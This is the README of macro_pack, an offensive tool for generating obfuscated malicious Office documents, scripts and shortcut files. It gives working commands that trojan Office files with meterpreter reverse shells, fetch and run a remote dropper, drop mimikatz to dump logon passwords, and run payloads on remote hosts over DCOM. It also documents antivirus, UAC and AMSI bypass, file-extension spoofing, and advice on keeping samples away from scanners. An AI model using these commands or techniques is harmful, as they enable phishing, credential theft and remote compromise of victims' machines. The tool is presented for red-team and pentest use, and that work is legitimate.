# macro\_pack

## Short description

The macro\_pack is a tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format.
Now it also handles various shortcuts formats.  
This tool can be used for redteaming, pentests, demos, and social engineering assessments.
macro\_pack will simplify antimalware solutions bypass and automatize the process from vb source to final Office document or other payload type.  
It is very simple to use:
* No configuration
* Everything can be done using a single line of code
* Generation of majority of Office formats and VBS based formats
* Payloads for advanced social engineering attacks (email, USB key, etc)

The tool is compatible with payloads generated by popular pentest tools (Metasploit, Empire, ...).
It is also easy to combine with other tools as it is possible to read input from stdin and have a quiet output to another tool.
This tool is written in Python3 and works on both Linux and Windows platform.

**Note:** Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features.

### Obfuscation

The tool will use various obfuscation techniques, all automatic.
Obfuscation features are compatible with all VBA and VBS based format which can be generated by macro\_pack.  
Basic obfuscation (-o option) includes:
* Renaming functions
* Renaming variables
* Removing spaces
* Removing comments
* Encoding Strings


Note that the main goal of macro\_pack obfuscation is not to prevent reverse engineering, it is to prevent antivirus detection.


### Generation

Macro Pack can generate several kinds of MS office documents and scripts formats.
The format will be automatically guessed depending on the given file extension.
File generation is done using the option --generate or -G.  
Macro Pack pro version also allow to trojan existing Office files with option --trojan or -T

Ms Office Supported formats are:
* MS Word (.doc, .docm, .docx, .dotm)
* MS Excel (.xls, .xlsm, .xslx, .xltm)
* MS PowerPoint (.pptm, .potm)
* MS Access (.accdb, .mdb)
* MS Visio (.vsd,.vsdm)
* MS Project (.mpp)

Scripting (txt) supported formats are:  
* VBA text file (.vba)
* VBS text file (.vbs).
* Windows Script File (.wsf)
* Windows Script Components scriptlets (.wsc, .sct)
* HTML Applications (.hta)
* XSLT Stylesheet (.xsl) (Yes MS XSLT contains scripts ^^)

Shortcuts/Shell supported formats are:
* Shell Link (.lnk)
* Explorer Command File (.scf)
* URL Shortcut (.url)
* Groove Shortcuts (.glk)
* Settings Shortcuts (.settingcontent-ms)
* MS Library (.library-ms)
* Setup Information (.inf)
* Excel Web Query (.iqy)
* Visual Studio Project (.csproj)
* Command line (.cmd)
* SYmbolic LinK (.slk) Pro version only
* Compressed HTML Help (.chm) Pro version only


Note that all scripting and shortcuts formats (except LNK) can be generated on Linux version of macro\_pack as well.



### Ethical use

The macro\_pack tool shall only be used by pentester, security researchers, or other people with learning purpose. 
I condemn all use of security tools for unethical actions (weather these ar legal or illegal).
I know this will not prevent usage by malicious people and that is why all features are not publicly released.

### About pro mode...
You may notice that not all part of macro\_pack is available. Only the community version is available online.
Features in the pro version are really "weaponizing" the process, and I do not want them available to all script kiddies out there.
The pro mode includes features such as:
* Advance antimalware bypass
* Advanced Shellcode injection methods
* Command line obfuscation (Dosfuscation)
* ASR and AMSI bypass
* Self unpacking VBA/VBS payloads
* Trojan existing MS Office documents, Help files and Visual Studio projects.
* Embed decoy payload
* Lateral movement using DCOM objects
* Anti reverse engineering 
* Sandbox detection
* Support of more formats such as Excel 4.0 SYLK and compiled help files
* Run advanced VB payload from unusual formats
* Weaponized templates and additional templates (ex EMPIRE, AUTOSHELLCODE)
* Excel 4.0 macros (XLM)
* Lot of more advanced stuff

Some short demo videos are available on the [sevagas youtube channel](https://www.youtube.com/channel/UCgWXxtLNEOeNuEFO3ZgbEOw).

Note that MP pro is only available as a commercial offer for professionals.

### Some macro\_pack pro examples

- Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-reversz features.
```bash
echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass --stealth --antisandox  -G "E:\accounting\report.xls"   
```

- Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). Keep-alive is needed because we need meterpreter to stay alive before we migrate.
```bash
msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm
```

- Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. 
```bash
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm
```

- Execute a macro on a remote PC using DCOM
```batch
REM Step 1: Ensure you have enough rights
net use  \\192.168.0.8\c$ /user:domain\username password

REM Step 2: Generate document, for example here, meterpreter reverse TCP Excel file
echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G meter.xlsm
REM Step 3: Copy the document  somewhere on remote share
copy meter.xlsm "\\192.168.0.8\c$\users\username\meter.xlsm"
REM Step 4: Execute!
macro_pack.exe --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"

REM Step 2 to 4 in one step:
echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\users\username\meter.xlsm" --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"

```



## All community version options

```
 Main payload generation options:
    -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the payload format based on extension.
        MacroPack supports most Ms Office and VB based payloads as well various kinds of shortcut files.
        Note: Office payload generation requires that MS Office application is installed on the machine
    --listformats View all file formats which can be generated by MacroPack
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option or non VB formats
        If no input file is provided, input must be passed via stdin (using a pipe).
    -t, --template=TEMPLATE_NAME    Use code template already included in MacroPack
        MacroPack supports multiple predefined templates useful for social engineering, redteaming, and security bypass
    --listtemplates View all templates provided by MacroPack
    -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
        Use with EMBED_EXE template to auto drop and exec the file or with EMBED_DLL to drop/load the embedded dll.


 Security bypass options:
    -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)
    --obfuscate-names-charset=<CHARSET> Set a charset for obfuscated variables and functions
        Choose between: alpha, alphanum, complete or provide the list of char you want
    --obfuscate-names-minlen=<len> Set min length of obfuscated variables and functions (default 8)
    --obfuscate-names-maxlen=<len> Set max length of obfuscated variables and functions (default 20)
    --uac-bypass Execute payload with high privileges if user is admin. Compatible with most MacroPack templates


 Other options:
    -q, --quiet Do not display anything on screen, just process request.
    -p, --print Display result file on stdout (will display VBA for Office formats)
        Combine this option with -q option to pipe result into another program
        ex: cat input_file.vba | macro_pack.exe -o -G obfuscated.vba -q -p | another_app
    -s, --start-function=START_FUNCTION   Entry point of macro file
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
    --icon Path of generated file icon. Default is %windir%\system32\imageres.dll,67
    --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
        This option is only compatible with Excel formats.
    --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
        This will trigger AutoOpen/Workbook_Open automatically.
        If no auto start function, use --start-function option to indicate which macro to run.
    --unicode-rtlo=SPOOF_EXTENSION Inject the unicode U+202E char (Right-To-Left Override) to spoof the file extension when view in explorers.
            Ex. To generate an hta file with spoofed jpg extension use options: -G something.hta --unicode-rtlo=jpg
            In this case, windows or linux explorers will show the file named as: somethingath.jpg
    -l, --listen=ROOT_PATH      Open an HTTP server from ROOT_PATH listening on default port 80.
    -w, --webdav-listen=ROOT_PATH Open a WebDAV server on default port 80, giving access to ROOT_PATH.
    --port=PORT Specify the listening port for HTTP and WebDAV servers.


    -h, --help   Displays help and exit
           

```



## Template usage
  
Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.  
Here are all the available templates.

            
### HELLO  
Just print a hello message and awareness about macro  
Give this template the name or email of the author

  -> Example: ```echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm``` 
 
This template also generates a  meterpreter.rc file to create the Metasploit handler
  -> Example: ```msfconsole -r meterpreter.rc``` 


### EMBED_EXE          
Drop and execute an embedded file.
Combine with --embed option, it will drop and execute the embedded file with random name under TEMP folder.
 -> Example: ```macro_pack.exe  -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs```

-> Example2 : ```echo "main log privilege::debug sekurlsa::logonpasswords exit" | macro_pack.exe -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta```



## Efficiency

The various features were tested against locally installed Antimalware solutions as well as online service. I ran multiple tests with several kind of payloads and macro\_pack features.
A majority of antivirus static will be evaded by the simple "obfuscate" option. However, as most free tools payloads are generally caught by behavioural anaysis such as AMSI.
Features available in MacroPack pro mode generally permit full AV bypass including AMSI.

**Warning:** Do not submit your samples to online scanner (ex VirusTotal), It's the best way to break your stealth macro.
I also suggest you do not submit to non reporting site such as NoDistribute. You cannot be sure what these sites will do with the data you submit. 
If you have an issue with macro\_pack AV detection you can write to us for advice or submit an issue or pull request.
